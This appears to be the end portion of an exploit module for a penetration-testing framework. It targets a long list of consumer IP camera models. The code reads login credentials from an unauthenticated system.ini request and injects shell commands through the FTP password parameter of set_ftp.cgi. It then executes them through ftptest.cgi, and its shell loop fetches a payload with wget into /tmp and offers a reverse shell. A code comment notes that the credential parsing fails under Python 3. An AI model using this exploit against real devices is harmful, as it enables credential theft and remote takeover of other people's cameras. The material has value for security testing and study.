            'Wanscam XHA-120903181',
            'Wanscam XHA-4020a2',
            'Wanscam __PTZ',
            'Wanscam chiOthernese',
            'Wanscam ip',
            'Wanscam jw0005',
            'Wanscam jw0010',
            'Wansview 541',
            'Wansview 625W',
            'Wansview MCM-627',
            'Wansview N540w',
            'Wansview NCB-534W',
            'Wansview NCB-541W',
            'Wansview NCB-541w',
            'Wansview NCB-543W',
            'Wansview NCB541W',
            'Wansview NCB545W',
            'Wansview NCL-610W',
            'Wansview NCL610D04',
            'Wansview NCL614W',
            'Wansview Other',
            'Wansview dcs543w',
            'Wansview nc543w',
            'Wardmay+CCTV WDM-6702AL',
            'Watch+bot+Camera resup',
            'WebcamXP Other',
            'WinBook Other',
            'WinBook T-6835',
            'WinBook T-6835WIP',
            'WinBook T-7838',
            'Winic NVT-530004',
            'Wise+Group Other',
            'X-Price Other',
            'X10 39A',
            'X10 AIRSIGHT',
            'X10 AirSight',
            'X10 Airsight',
            'X10 Jake',
            'X10 Other',
            'X10 XC-38A',
            'X10 XX-36A',
            'X10 XX-39A',
            'X10 XX-56A',
            'X10 XX-59A',
            'X10 XX-60',
            'X10 XX-69A',
            'X10 XX41Ahome',
            'XVision Other',
            'XXCamera 53100',
            'XXCamera 5330-E',
            'XXCamera Other',
            'XXCamera XXC-000723-NJFJD',
            'XXCamera XXC-092411-DCAFC',
            'XXCamera XXC-50100-H',
            'XXCamera XXC-50100-T',
            'XXCamera XXC-5030-E',
            'XXCamera XXC-53100-T',
            'XXCamera XXC52130',
            'Xin+Ling Other',
            'Yawcam Other',
            'Zilink Other',
            'Zmodo CMI-11123BK',
            'Zmodo IP-900',
            'Zmodo Other',
            'Zodiac+Security 909',
            'Zodiac+Security Other',
            'Zoneway NC638MW-P',
            'ZyXEL Other',
            'alexim Other',
            'alexim cam22822',
            'alias Other',
            'all+in+one+ Other',
            'all+in+one+ b1',
            'all-in-one Other',
            'allecto DVC-150IP',
            'apc Other',
            'asw-006 Other',
            'boh l',
            'bravo Other',
            'bush+plus BU-300WF',
            'ccam p2p',
            'china 8904W',
            'china HDIPCAM',
            'china IPCAM',
            'china Other',
            'china PTZCAM',
            'china np-02',
            'ciana+exports antani',
            'cina Other',
            'coolead L',
            'coolead L610WS',
            'dax Other',
            'denver IPC-320',
            'denver IPO-320',
            'e-landing 720p',
            'eScam QF100',
            'ebw Other',
            'epexis PIPCAMHD82',
            'epexis pipcam5',
            'esecure nvp',
            'geeya C602',
            'geeya P2P',
            'geeya c801',
            'hdcam Other',
            'homeguard 720P',
            'homeguard Other',
            'homeguard Wireless',
            'homeguard wifi',
            'iView ID002A',
            'iView Other',
            'insteon 75790',
            'insteon 75790wh',
            'insteon High',
            'insteon Other',
            'insteon Wireless',
            'iuk 5A1',
            'ivision hdwificam',
            'iwitness bullet',
            'jwt Other',
            'jyacam JYA8010',
            'kadymay KDM-6800',
            'kadymay KDM6702',
            'kadymay KMD-6800',
            'kadymay Other',
            'kang+xun xxc5030-t',
            'kines Other',
            'kiocong 1601',
            'kiocong 1602',
            'kiocong 1609',
            'kiocong Other',
            'kodak 201pl',
            'koicong 1601',
            'l+series CAM0758',
            'l+series CAM0760',
            'l+series Other',
            'l+series V100',
            'logan n8504hh',
            'meyetech 095475-caeca',
            'meyetech 188091-EFBAE',
            'meyetech Other',
            'meyetech WirelessCam',
            'micasaverde VistaCamSD',
            'pipcam HD17',
            'pni 941w',
            'pni IP451W',
            'pni IP541W',
            'pni IP941W',
            'pni IP951W',
            'pni Other',
            'pnp IP',
            'pnp Other',
            'semac Other',
            'skylink WC-300PS',
            'storex D-10H',
        ),
    }

    target = OptIP("", "Target IPv4 or IPv6 address")
    port = OptPort(80, "Target HTTP port")

    def run(self):
        if self.check():
            print_success("Target is vulnerable")
            print_status("Invoking command loop...")
            print_status("It is blind command injection - response is not available. Use reverse_tcp <reverse ip> <port>")
            shell(self, architecture="mipsbe", method="wget", location="/tmp")
        else:
            print_error("Exploit failed. Device seems to be not vulnerable.")

    def execute(self, cmd):
        # Get credentials
        print_status("Extracting credentials")

        response = self.http_request(
            method="GET",
            path="/system.ini?loginuse&loginpas"
        )

        # Find the magic sequence "0000 0a0a 0a0a 01"
        magic_sequence_location = response.content.find(b"\x00\x00\x0a\x0a\x0a\x0a\x01")

        # Skip ahead by 144 bytes to the beginning of username
        username_location = magic_sequence_location + 144

        # Read every byte in a loop until the first '\x00'
        # THIS WILL NOT WORK UNDER PYTHON 3 (bytearrays return ints in py3)!
        username_bytes = bytearray()
        next_username_byte = bytes()
        index = username_location

        while next_username_byte != b"\x00":
            username_bytes.append(response.content[index])
            next_username_byte = response.content[index + 1]
            index = index + 1
        username = username_bytes.decode('utf-8')
        print_info("Username: " + username)
        # Same for the password
        # Get the password's location
        # Everything between username and password is \x00, so loop until that's no longer the case
        current_byte_location = username_location + len(username_bytes)
        null_byte = bytearray(b'\x00')
        current_byte = bytearray(b'\x00')
        while current_byte == null_byte:
            current_byte[0] = response.content[current_byte_location].encode('utf-8')
            current_byte_location = current_byte_location + 1
        # I can't be bothered to debug anymore, let's just subtract 1
        password_location = current_byte_location - 1
        # Read every byte in a loop until the first '\x00'
        password_bytes = bytearray()
        next_password_byte = bytes()
        index = password_location
        while next_password_byte != b'\x00':
            password_bytes.append(response.content[index])
            next_password_byte = response.content[index + 1]
            index = index + 1
        password = password_bytes.decode('utf-8')
        print_info("Password: " + password)

        # Send command
        command_url = "{}:{}/set_ftp.cgi?next_url=ftp.htm&loginuse={}&loginpas={}&svr=192.168.1.1&port=21&user=ftp&pwd=$({})&dir=/&mode=PORT&upload_interval=0".format(self.target, self.port, username, password, cmd)
        http_request(method="GET", url=command_url)

        # Run command
        run_url = "{}:{}/ftptest.cgi?next_url=test_ftp.htm&loginuse={}&loginpas={}".format(self.target, self.port, username, password)
        http_request(method="GET", url=run_url)

        time.sleep(2)
        return ""

    @mute
    def check(self):
        response = self.http_request(
            method="GET",
            path="/system.ini?loginuse&loginpas"
        )

        if response is None:
            return False

        if response.status_code == 200 and b'\x00\x00\x0a\x0a\x0a\x0a\x01' in response.content:
            return True

        return False
